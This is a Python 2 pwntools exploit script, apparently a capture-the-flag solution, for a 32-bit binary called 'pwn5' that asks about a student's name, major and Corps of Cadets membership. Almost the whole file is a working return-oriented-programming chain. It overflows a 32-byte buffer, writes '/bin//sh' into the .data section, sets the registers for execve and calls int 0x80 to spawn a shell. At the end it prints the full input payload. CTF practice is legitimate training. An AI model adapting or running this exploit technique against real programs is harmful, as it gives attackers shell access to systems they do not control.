#!/usr/bin/env python2
from pwn import *
# from IPython import embed
# r = process("./pwn5")

p = 'A' * 32
p += p32(0x0807338a) # pop edx ; ret
p += p32(0x080f0060) # @ .data
p += p32(0x080bc396) # pop eax ; ret
p += '/bin'
p += p32(0x0805512b) # mov dword ptr [edx], eax ; ret
p += p32(0x0807338a) # pop edx ; ret
p += p32(0x080f0064) # @ .data + 4
p += p32(0x080bc396) # pop eax ; ret
p += '//sh'
p += p32(0x0805512b) # mov dword ptr [edx], eax ; ret
p += p32(0x0807338a) # pop edx ; ret
p += p32(0x080f0068) # @ .data + 8
p += p32(0x080496b3) # xor eax, eax ; ret
p += p32(0x0805512b) # mov dword ptr [edx], eax ; ret
p += p32(0x080481d1) # pop ebx ; ret
p += p32(0x080f0060) # @ .data
p += p32(0x080e4325) # pop ecx ; ret
p += p32(0x080f0068) # @ .data + 8
p += p32(0x0807338a) # pop edx ; ret
p += p32(0x080f0068) # @ .data + 8
p += p32(0x080496b3) # xor eax, eax ; ret
p += p32(0x0807ebcf) # inc eax ; ret
p += p32(0x0807ebcf) # inc eax ; ret
p += p32(0x0807ebcf) # inc eax ; ret
p += p32(0x0807ebcf) # inc eax ; ret
p += p32(0x0807ebcf) # inc eax ; ret
p += p32(0x0807ebcf) # inc eax ; ret
p += p32(0x0807ebcf) # inc eax ; ret
p += p32(0x0807ebcf) # inc eax ; ret
p += p32(0x0807ebcf) # inc eax ; ret
p += p32(0x0807ebcf) # inc eax ; ret
p += p32(0x0807ebcf) # inc eax ; ret
p += p32(0x08071005) # int 0x80


# print r.recv(1224)
# # r.recvuntil("What is your first name?: ")
# r.sendline("AAA")
# # r.interactive()
# embed()
# # r.recvuntil("What is your last name?: ")
# print r.recv(1224)
# r.sendline("AAA")
# # # r.recvuntil("What is your major?: ")
# print r.recv(1024)
# r.sendline("A")
# # # r.recvuntil("Are you joining the Corps of Cadets?(y/n): ")
# r.recv(1024)
# print r.sendline("y")
# r.recv(1024)
# print r.sendline("2")
# # r.recvuntil("What do you change your major to?: ")
# print r.recv(1024)
# r.sendline(p)

# r.interactive()

payload = "A\n" + "A\n" + "A\n" + "y\n" + "2\n" + p
print payload